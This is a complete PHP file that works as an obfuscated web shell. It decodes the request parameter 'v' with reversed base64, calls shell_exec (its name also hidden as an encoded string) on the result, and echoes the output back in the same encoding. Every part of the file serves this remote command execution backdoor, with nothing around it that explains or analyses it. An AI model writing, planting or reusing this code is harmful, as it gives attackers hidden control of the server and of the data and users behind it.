<?php 

//base64 encode
function lTpiLG9S8U($tfxXpI8qBe){
    return strrev(str_replace("=","",base64_encode($tfxXpI8qBe)));

}

//base64 decode
function g3AEV1WRe0($sTZ24mrR5G){
    $sTZ24mrR5G=strrev($sTZ24mrR5G);
    $fyaHlSGV4A=(4-(strlen($sTZ24mrR5G)%4));
    if($fyaHlSGV4A!=4){
        $sTZ24mrR5G.=str_repeat("=",$fyaHlSGV4A);
    }

    return base64_decode($sTZ24mrR5G);

}

if(isset($_REQUEST['v'])){
    
    //shell_exec
    $zG2dtRRV4G=g3AEV1WRe0("wYlhXZfxGblh2c");
    echo lTpiLG9S8U($zG2dtRRV4G(g3AEV1WRe0($_REQUEST['v'])));
}
